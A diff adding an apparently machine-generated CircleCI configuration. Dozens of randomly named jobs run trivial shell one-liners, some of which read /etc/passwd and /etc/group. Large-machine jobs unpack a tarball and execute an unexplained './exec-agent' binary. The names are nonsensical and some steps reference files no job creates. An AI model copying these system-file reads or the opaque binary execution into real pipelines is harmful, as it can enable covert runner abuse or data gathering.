@@ -1,0 +1,1567 @@
+version: 2.1
+
+jobs:
+  CFQueueError:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Here we warn the stakeholders
+          command: |
+            mkdir -p /tmp/zone1
+            set +o pipefail 2>/dev/null; # final e
+            cat <(seq 1 867517) > /tmp/zone1/sha_58bbd6987d; true
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/sha_58bbd6987d)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'sha_58bbd6987d'
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/sha_58bbd6987d 2>/dev/null) → md5 $(md5sum /tmp/zone1/sha_58bbd6987d 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  gear-map:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: promote referral bonuses r11
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo "the quick brown fox" >| /tmp/metrics_milk_draft.out && cat /tmp/metrics_milk_draft.out; true ; } > /tmp/zone1/run0_2b5c
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/run0_2b5c)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'run0_2b5c'
+  strated-31:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  ttpUP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Shall we relocate the core dumps
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; ls -pai --color=always -I "[a-m]*" ./ | shuf -n 2; true ; } > /tmp/zone1/UCJR79
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/UCJR79)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'UCJR79'
+  aug23-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  dwFlagsChunkExport:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Ignition drag
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo 7 49 56 98 15 |tr ' ' '\n' |sort -n |uniq -c |sort -u; true ; } > /tmp/zone1/seed-47h
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/seed-47h)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'seed-47h'
+  callisto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  ref_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Glaze the base model
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; ls -il1p /usr/share/*/|sort -k9; true ; } > /tmp/zone1/97s8p59s5
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/97s8p59s5)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - '97s8p59s5'
+  go1-21-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  BIT27:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: dilution SKIP
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sort -r | head -n 6; true ; } > /tmp/zone1/RMMg4ufxXnEY
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/RMMg4ufxXnEY)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'RMMg4ufxXnEY'
+  sm-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  LG42502:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bogota Office Tightening
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo cat shark duck | xargs printf "%s\n" | sort; true ; } > /tmp/zone1/RMA-61702-BJ
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/RMA-61702-BJ)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'RMA-61702-BJ'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  p_new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Evening build
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"${TMPDIR:-/tmp}/top.gz"&&zcat "${TMPDIR:-/tmp}/top.gz" | head -n 3; true ; } > /tmp/zone1/VeLVEtHArboreAsTGLaciER
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/VeLVEtHArboreAsTGLaciER)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'VeLVEtHArboreAsTGLaciER'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  recBundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: upload sbom
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; df -H; true ; } > /tmp/zone1/P20712
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/P20712)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'P20712'
+  ruby3-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  XtX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Hr Team Pack Overstock
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; for elem in duck owl frog swan bear; do printf '%s\n' ${elem}; done | sort -r; true ; } > /tmp/zone1/PO-2023-92431
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/PO-2023-92431)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'PO-2023-92431'
+  zulu-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/PO-2023-92431 2>/dev/null) → md5 $(md5sum /tmp/zone1/PO-2023-92431 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  yolo5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Train the contracts week one
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo yes | sed -e 's/e/3/g' -e 's/l/1/g'; true ; } > /tmp/zone1/_wip_fed1e91
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/_wip_fed1e91)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - '_wip_fed1e91'
+  omar-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  try_from_script:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: 100x merge
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "/tmp/cinema.gz" && zgrep -c nologin "/tmp/cinema.gz"; true ; } > /tmp/zone1/sha_3b3330db49947c38
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/sha_3b3330db49947c38)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'sha_3b3330db49947c38'
+  titan2-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/sha_3b3330db49947c38 2>/dev/null) → md5 $(md5sum /tmp/zone1/sha_3b3330db49947c38 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  userDidLoad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Open the checkout page slowly
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -type f -exec du -h {} ";" 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/zone1/token_atoll
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/token_atoll)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'token_atoll'
+  t-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  deg_ave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Review the cash forecast period 3
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; ls -F1 /etc/security /lib | wc -w; true ; } > /tmp/zone1/temp-94b7
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/temp-94b7)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'temp-94b7'
+  prometheus-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/temp-94b7 2>/dev/null) → md5 $(md5sum /tmp/zone1/temp-94b7 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  froanswoazham-klun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: I like to inspect the test matrix early
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; function lsd { for a in "$@"; do echo "[$a]"; done; }; lsd duck lion crow; true ; } > /tmp/zone1/os.1475
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/os.1475)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'os.1475'
+  check-production-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/os.1475 2>/dev/null) → md5 $(md5sum /tmp/zone1/os.1475 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  quinninator:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Trace plus open
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; df -k | awk 'NR>1 {print $5, $6}' | fold -w 49; true ; } > /tmp/zone1/SQL-GPU
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/SQL-GPU)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'SQL-GPU'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  gl-PT-x-scarf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Here we onboard the timesheets
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; awk 'FNR==1{print FILENAME}' /etc/login.defs /etc/fstab | head -n 2; true ; } > /tmp/zone1/HTTP-north
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/HTTP-north)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'HTTP-north'
+  ensure-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  transientGraphFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Dispatch the eval harness from cold storage
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; grep -cn if /etc/profile; true ; } > /tmp/zone1/20220327_214619
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/20220327_214619)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - '20220327_214619'
+  PackageStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  intrauat25:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Begin approving the org chart
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; find /usr/share -type f -name "*.conf" -print0 2>/dev/null | xargs -0r du -ch | tail -n 1; true ; } > /tmp/zone1/a5a9ccbe-a0b7-7905-2e0f-de34fae42cf8
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/a5a9ccbe-a0b7-7905-2e0f-de34fae42cf8)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'a5a9ccbe-a0b7-7905-2e0f-de34fae42cf8'
+  bug-1892:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  Crown_58079:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Fuzz the style rules once lunch is done
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; cp /etc/group "${TMPDIR:-/tmp}/status_array.conf" && sed --in-place '/^root/d' "${TMPDIR:-/tmp}/status_array.conf" && wc -l "${TMPDIR:-/tmp}/status_array.conf"; true ; } > /tmp/zone1/xx_aa0b85f8f04bd2
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/xx_aa0b85f8f04bd2)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'xx_aa0b85f8f04bd2'
+  canary-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/xx_aa0b85f8f04bd2 2>/dev/null) → md5 $(md5sum /tmp/zone1/xx_aa0b85f8f04bd2 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  StandardTagPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: prep
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo -n 'scanning directory' | fold -w 6; true ; } > /tmp/zone1/PXL29214
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/PXL29214)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'PXL29214'
+  prometheus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  admin_page_desc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: done selecting image carousel
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; printf '%s\n' fox koala panda zebra frog >${TMPDIR:-/tmp}/ant.tmp && wc -l ${TMPDIR:-/tmp}/ant.tmp; true ; } > /tmp/zone1/epoch-14p
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/epoch-14p)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'epoch-14p'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  XITER9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Refresh the tooltip on tablet
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo "take out the trash"|fold -w 3; true ; } > /tmp/zone1/v_71038
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/v_71038)"
+      - persist_to_workspace:
